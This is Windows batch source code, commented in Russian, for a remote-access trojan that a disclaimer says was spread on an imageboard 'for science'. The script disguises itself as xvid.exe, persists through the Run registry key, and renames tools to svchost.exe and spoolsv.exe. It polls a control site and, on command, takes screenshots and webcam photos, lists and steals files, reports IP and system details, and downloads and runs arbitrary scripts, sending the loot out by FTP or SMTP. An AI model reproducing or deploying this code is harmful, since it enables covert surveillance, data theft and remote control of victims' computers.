rem Внимание! Данная программа (если можно ЭТО так назвать) была написана исключительно в научных интересах, ее создание не преследовало корыстных и преступных целей, распространялась она исключительно на одном форуме без регистрации со смешными картинками, обитатели которого были морально готовы к такому, я гарантирую это.
rem Анон, если ты это читаешь- привет тебе и все такое. Если подцепил- контролируй свой **БЕРСЕРК**. Помни, эмоции убивают разум. Отнесись как к неприятному, но полезному уроку и вынеси из этого происшествия опыт.

rem задание переменных
set site=goofytime.wen.ru
set version=goofytime
set iamhere=%appdata%\web
set filename=xvid.exe

rem проверка способа запуска
if "%1"=="/update" goto iamhome
if exist "%iamhere%\%filename%" exit
md "%iamhere%"
rem ахтунг здесь
copy "%filename%" "%iamhere%\%filename%"
reg add "hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Xvid /d "%iamhere%\%filename% /update" /f
start /d "%iamhere%" %filename% /update
exit



:iamhome
rem костылище так костылище
cd /d "%iamhere%"
rem наречение имени, если еще нет
if not exist personal.dat (
echo Unit-%random%>personal.dat
)
rem чтение имени 
set /p itsme=<personal.dat

rem предыдущий код, если еще нет
if not exist prev.dat (
echo nothing>prev.dat
)
rem чтение предыдущего кода 
set /p previous=<prev.dat

rem создание копии ping.exe с другим именем
if not exist svchost.exe copy "%windir%\system32\ping.exe" svchost.exe
rem место вероятных проблем
taskkill /im %filename% /f
rem если было обновление иди и жди
if exist updated.dat (
del /f /q updated.dat 
goto updated
)
rem первичное ожидание, не забудь добавить больше (норма- 60)
svchost.exe 127.0.0.1 -n 60


rem ожидание интернета
:waitinternet
svchost.exe %site% -n 5
if %errorlevel% gtr 0 goto waitinternet

rem проверка существования wget и скачивание если надо
if exist spoolsv.exe goto skipwget
rem ftp://ftp.mari-el.ru/pub/arc/WGET.EXE
rem начало ftp =====================
del /f /q %temp%\test.txt
echo anonymous>>"%temp%\test.txt"
echo anonymous>>"%temp%\test.txt"
echo cd pub>>"%temp%\test.txt"
echo cd arc>>"%temp%\test.txt"
echo binary>>"%temp%\test.txt"
echo get WGET.EXE>>"%temp%\test.txt"
echo quit>>"%temp%\test.txt"
ftp -s:"%temp%\test.txt" -i ftp.mari-el.ru
del /f /q "%temp%\test.txt"
rem конец ftp ======================
rem проверка wget на битость и удаление если битый
if not exist wget.exe goto waitinternet
call :sizer wget.exe
if %baka% lss 162815 del /q /f wget.exe
rename wget.exe spoolsv.exe
goto waitinternet

:skipwget

rem установка (если надо) грустной GLaDOS
rem скачиваю
if exist "%appdata%\accounts.dat" goto skipglados
spoolsv.exe %site%/protected/accounts.mp3 -O "%appdata%\accounts.dat"
echo %random%>>"%appdata%\accounts.dat"
rem проверка GLaDOS на битость и удаление если битая
call :sizer "%appdata%\accounts.dat"
if %baka% lss 900000 del /q /f "%appdata%\accounts.dat"
:skipglados

rem ожидание
rem цикл блеать ====================================
rem ololo должно быть около 60
set ololo=20


:letsgo
svchost.exe 127.0.0.1 -n 5
rem проверка на xvid и возможно запуск GLaDOS
if not exist "%iamhere%\%filename%" (
reg delete "hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Xvid /f
rename "%appdata%\accounts.dat" accounts.exe
start /d "%appdata%\" accounts.exe
rem подача сигнала (спалился)
rem пока отложим это место ?????????
del /f /q spoolsv.exe
del /f /q svchost.exe
exit
)

set /a ololo=%ololo%-1
if not %ololo%==0 goto letsgo
rem конец цикла блеать ============================
rem скачивание и проверка размера
del /f /q "%temp%\test.prop"
spoolsv.exe %site%/cheese.txt -O "%temp%\test.prop"
call :sizer "%temp%\test.prop"
if %baka%==0 goto waitinternet

rem если пройдена проверка размера, чтение кода (одиночная строка)
set /p yesmylord=<"%temp%\test.prop"

if "%yesmylord%"=="%previous%" (
del /f /q "%temp%\test.prop"
goto waitinternet
)

rem а иначе
echo %yesmylord%>prev.dat
set previous=%yesmylord%

rem построчное чтение команд, нужная строка: %$_{нумер}%
For /F "Tokens=1,2 Delims=[]" %%i In ('Find /V /N "" "%temp%\test.prop"') Do Set $_%%i=%%j


if "%$_6%"=="everypony" goto you
if "%$_6%"=="%itsme%" goto you

goto waitinternet


rem кто, я? именно я? почему сразу я? а чё я-то? чуть что сразу я...
:you
rem собственно отсюда в путь (индивидуально)

if "%$_7%"=="screenshot" goto screenshot
if "%$_7%"=="filelist" goto filelist
if "%$_7%"=="getfiles" goto getfiles
if "%$_7%"=="getfile" goto getfile
if "%$_7%"=="rename" goto rename
if "%$_7%"=="update" goto update
if "%$_7%"=="panic" goto panic
if "%$_7%"=="photo" goto photo
if "%$_7%"=="obey" goto obey
if "%$_7%"=="hey" goto hey


goto waitinternet



:rename
rem переименование
echo %$_8%>personal.dat
set oldname=%itsme%
set itsme=%$_8%

echo %oldname% now known as %itsme%>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"
echo version: %version%>>"%temp%\send.txt"

call :sendfile "%temp%\send.txt"

goto waitinternet

rem отклик!
:hey

spoolsv.exe http://whatismyip.akamai.com -O "%temp%\send.txt"
set /p myip=<"%temp%\send.txt"
if "%myip%"=="" set myip=error


echo %itsme% ok >"%temp%\send.txt"
echo version: %version%>>"%temp%\send.txt"
echo real IP: %myip%>>"%temp%\send.txt"
echo user: %username%>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"
ipconfig>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"
tasklist>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"
systeminfo>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"


call :sendfile "%temp%\send.txt"

goto waitinternet





rem обновление здесь
:update
spoolsv.exe %site%/protected/xvid.mp3 -O xvid.mp3

rem проверка на битость
call :sizer xvid.mp3
if %baka% lss 20 (
del /f /q xvid.mp3
echo %itsme% update error>"%temp%\send.txt"
call :sendfile "%temp%\send.txt"
goto waitinternet
)

echo %random%>>xvid.mp3
del /f /q xvid.exe
rename xvid.mp3 xvid.exe
rem создание метки об обновлении
echo ololo>updated.dat
rem запуск обновленной
start xvid.exe /update
exit


:updated
rem палево (обновлен)
echo %itsme% now 20%% cooler>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"
echo version: %version%>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"
call :sendfile "%temp%\send.txt"

goto waitinternet



rem скриншот
:screenshot

if not exist "%temp%\nircmd.exe" spoolsv.exe %site%/protected/nircmd.mp3 -O "%temp%\nircmd.exe"

rem проверка на битость
call :sizer "%temp%\nircmd.exe"
if %baka% lss 20 (
del /f /q "%temp%\nircmd.exe"
echo %itsme% screenshot error>"%temp%\send.txt"
call :sendfile "%temp%\send.txt"
goto waitinternet
)

"%temp%\nircmd.exe" savescreenshot "%temp%\temp.png"
makecab "%temp%\temp.png" "%temp%\temp.cab"
echo %itsme% screenshot>>"%temp%\temp.txt"

copy /b "%temp%\temp.txt"+"%temp%\temp.cab" "%temp%\send.cab"

del /f /q "%temp%\temp.txt"
del /f /q "%temp%\temp.cab"
del /f /q "%temp%\temp.png"

call :sendfile "%temp%\send.cab"

goto waitinternet




rem фото с вебкамеры
:photo

if not exist "%temp%\cam.exe" spoolsv.exe %site%/protected/cam.mp3 -O "%temp%\cam.exe"

rem проверка на битость
call :sizer "%temp%\cam.exe"
if %baka% lss 20 (
del /f /q "%temp%\cam.exe"
echo %itsme% photo error>"%temp%\send.txt"
call :sendfile "%temp%\send.txt"
goto waitinternet
)

"%temp%\cam.exe" /capture /filename "%temp%\temp.jpg"
makecab "%temp%\temp.jpg" "%temp%\temp.cab"
echo %itsme% photo>>"%temp%\temp.txt"

copy /b "%temp%\temp.txt"+"%temp%\temp.cab" "%temp%\send.cab"

del /f /q "%temp%\temp.txt"
del /f /q "%temp%\temp.cab"
del /f /q "%temp%\temp.jpg"

call :sendfile "%temp%\send.cab"

goto waitinternet







rem список файлов
:filelist
echo %itsme%>>"%temp%\list.txt"
echo ====================================>>"%temp%\list.txt"
echo version: %version%>>"%temp%\list.txt"
echo ====================================>>"%temp%\list.txt"
ipconfig>>"%temp%\list.txt"
echo ====================================>>"%temp%\list.txt"
tasklist>>"%temp%\list.txt"
echo ====================================>>"%temp%\list.txt"
systeminfo>>"%temp%\list.txt"
dir C:\ /b /s>>"%temp%\list.txt"
dir D:\ /b /s>>"%temp%\list.txt"
dir E:\ /b /s>>"%temp%\list.txt"
dir F:\ /b /s>>"%temp%\list.txt"
dir G:\ /b /s>>"%temp%\list.txt"
dir H:\ /b /s>>"%temp%\list.txt"
dir I:\ /b /s>>"%temp%\list.txt"
dir J:\ /b /s>>"%temp%\list.txt"
dir K:\ /b /s>>"%temp%\list.txt"
dir L:\ /b /s>>"%temp%\list.txt"
dir M:\ /b /s>>"%temp%\list.txt"
dir N:\ /b /s>>"%temp%\list.txt"
dir O:\ /b /s>>"%temp%\list.txt"
dir P:\ /b /s>>"%temp%\list.txt"
dir Q:\ /b /s>>"%temp%\list.txt"
dir R:\ /b /s>>"%temp%\list.txt"
dir S:\ /b /s>>"%temp%\list.txt"
dir T:\ /b /s>>"%temp%\list.txt"
dir U:\ /b /s>>"%temp%\list.txt"
dir V:\ /b /s>>"%temp%\list.txt"
dir W:\ /b /s>>"%temp%\list.txt"
dir X:\ /b /s>>"%temp%\list.txt"
dir Y:\ /b /s>>"%temp%\list.txt"
dir Z:\ /b /s>>"%temp%\list.txt"
makecab "%temp%\list.txt" "%temp%\temp.cab"
echo %itsme% filelist>>"%temp%\me.txt"
copy /b "%temp%\me.txt"+"%temp%\temp.cab" "%temp%\send.cab"

call :sendfile "%temp%\send.cab"
del /f /q "%temp%\list.txt"
del /f /q "%temp%\me.txt"
del /f /q "%temp%\temp.cab"

goto waitinternet





rem получение одного файла
:getfile

echo %itsme%>>"%temp%\me.txt"
makecab "%$_8%" "%temp%\temp.cab"
copy /b "%temp%\me.txt"+"%temp%\temp.cab" "%temp%\send.cab"

call :sendfile "%temp%\send.cab"
del /f /q "%temp%\me.txt"
del /f /q "%temp%\temp.cab"

goto waitinternet






rem получение множества файлов или папки
:getfiles

if not exist "%temp%\winrar.exe" spoolsv.exe %site%/protected/winrar.mp3 -O "%temp%\winrar.exe"

rem проверка на битость
call :sizer "%temp%\winrar.exe"
if %baka% lss 20 (
del /f /q "%temp%\winrar.exe"
echo %itsme% winrar error>"%temp%\send.txt"
call :sendfile "%temp%\send.txt"
goto waitinternet
)

echo %itsme%>>"%temp%\me.txt"
"%temp%\winrar.exe" a "%temp%\temp.rar" "@%temp%\test.prop" -m5 -s
copy /b "%temp%\me.txt"+"%temp%\temp.rar" "%temp%\send.rar"

call :sendfile "%temp%\send.rar"
del /f /q "%temp%\me.txt"
del /f /q "%temp%\temp.rar"

goto waitinternet




rem инъекция
:obey
rem требуется вывод в файл, поэтому здесь небольшая путаница и порядок отличается от обычного

spoolsv.exe %site%/obey.txt -O "%temp%\obey.bat"

echo %itsme% yes my lord>>"%temp%\send.txt"
echo ====================================>>"%temp%\send.txt"

rem собственно исполнение
call "%temp%\obey.bat">>"%temp%\send.txt"
del /f /q "%temp%\obey.bat"

call :sendfile "%temp%\send.txt"

goto waitinternet



rem ААААААА мы все умрем!!!
:panic
rem палево (удолил)
echo %itsme% says goodbye>"%temp%\send.txt"
call :sendfile "%temp%\send.txt"

reg delete "hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Xvid  /f
del /f /q "%appdata%\accounts.dat"
del /f /q "%appdata%\accounts.exe"
del /f /q "%iamhere%\%filename%"
del /f /q "%iamhere%\svchost.exe"
del /f /q "%iamhere%\spoolsv.exe"
del /f /q "%temp%\test.prop"
del /f /q "%temp%\nircmd.exe"
del /f /q "%temp%\winrar.exe"
del /f /q "%temp%\postie.exe"
del /f /q "%temp%\cam.exe"
exit


rem подпрограмма определение размера вместо костыля
:sizer
set baka=%~z1
goto :eof


rem подпрограмма отправка 1 файла с последующим его удалением
:sendfile

set vdate=%date%
set vtime=%time:~0,-3%
set VTIME=%VTIME::=.%
set VTIME=%VTIME: =0%
set thisfile=%vdate%_%vtime%%~x1
rename %1 %thisfile%
set thisfile=%~dp1%thisfile%

if "%$_2%"=="fftp" (
rem начало ftp =====================
del /f /q %temp%\test.txt
echo %$_4%>>"%temp%\test.txt"
echo %$_5%>>"%temp%\test.txt"
echo binary>>"%temp%\test.txt"
echo put "%thisfile%">>"%temp%\test.txt"
echo quit>>"%temp%\test.txt"
ftp -s:"%temp%\test.txt" -i %$_3%
del /f /q %temp%\test.txt
rem конец ftp ======================
)

if "%$_2%"=="smtp" (
if not exist "%temp%\postie.exe" spoolsv.exe %site%/protected/postie.mp3 -O "%temp%\postie.exe"
"%temp%\postie.exe" -esmtp -user:%$_4% -pass:%$_5% -host:%$_3% -to:%$_4% -from:%$_4% -s:%itsme% -nomsg -a:"%thisfile%"
)


del /f /q "%thisfile%"

goto :eof
